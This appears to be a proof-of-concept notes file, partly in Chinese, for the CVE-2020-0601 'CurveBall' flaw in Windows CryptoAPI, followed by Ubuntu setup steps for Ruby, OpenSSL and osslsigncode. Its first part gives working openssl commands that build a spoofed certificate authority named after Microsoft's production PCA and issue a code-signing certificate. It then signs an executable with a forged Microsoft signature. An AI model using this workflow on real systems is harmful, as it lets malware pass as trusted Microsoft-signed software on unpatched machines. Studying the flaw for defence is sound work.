# CVE-2020-0601
PoC for CVE-2020-0601- Windows CryptoAPI (Crypt32.dll)  POC: https://github.com/ollypwn/CurveBall


kali success: 
POC：https://github.com/ollypwn/CurveBall
Microsoft Windows
# openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt
Country Name (2 letter code) [AU]:US   国家名称
State or Province Name (full name) [Some-State]:Mississippi   州或省名
Locality Name (eg, city) []:Biloxi   城市
Organization Name：Microsoft Windows Production PCA 2011

openssl x509 -req -in Microsoft.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out Microsoft.crt -days 10000 -extfile openssl_cs.conf -extensions v3_cs
openssl pkcs12 -export -in Microsoft.crt -inkey Microsoft.key -certfile spoofed_ca.crt -name "Code Signing" -out Microsoft.p12

伪造微软签名：osslsigncode sign -pkcs12 Microsoft.p12 -n "Signed by DiDi" -pass 123 -in c1.exe -out c1_Microsoft_signed.exe


-Ubuntu(失败)-------------------------------------------------------
*Minimum requirements openssl 1.1.0 ruby 2.4.0
ubuntu Ruby update:
ruby -v
https://www.brightbox.com/docs/ruby/ubuntu/#adding-the-repository
$ sudo apt-get install software-properties-common
$ sudo apt-add-repository ppa:brightbox/ruby-ng
$ sudo apt-get update
$ apt-get install ruby2.6

*ubuntu openssl update:
https://www.jianshu.com/p/f0a9ef4522db
$ openssl version
升级openssl到1.1.0
$wget https://www.openssl.org/source/openssl-1.1.1d.tar.gz
安装
#tar -zxvf openssl-1.1.0g.tar.gz
#cd openssl-1.1.0g/
#./config
#make
#make install
配置
# mv /usr/bin/openssl /usr/bin/openssl.bak
# ln -s /usr/local/bin/openssl /usr/bin/openssl
# ln -s /usr/local/include/openssl /usr/include/openssl
# echo "/usr/local/lib" >> /etc/ld.so.conf
测试：
# openssl version
openssl: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory
openssl: error while loading shared libraries: libcrypto.so.1.1: cannot open shared object file: No such file or directory
查找文件
# cp /usr/local/lib/libssl.so.1.1 /usr/lib/
# cp /usr/local/lib/libcrypto.so.1.1 /usr/lib/

root@ubuntu-virtual-machine:~# openssl version
OpenSSL 1.1.1d  10 Sep 2019

*安装osslsigncode
https://software.opensuse.org/download.html?project=home:danimo&package=osslsigncode

对于 xUbuntu 16.04，请运行以下命令：
Keep in mind that the owner of the key may distribute updates, packages and repositories that your system will trust (more information).
sudo sh -c "echo 'deb http://download.opensuse.org/repositories/home:/danimo/xUbuntu_16.04/ /' > /etc/apt/sources.list.d/home:danimo.list"
wget -nv https://download.opensuse.org/repositories/home:danimo/xUbuntu_16.04/Release.key -O Release.key
sudo apt-key add - < Release.key
sudo apt-get update
sudo apt-get install osslsigncode
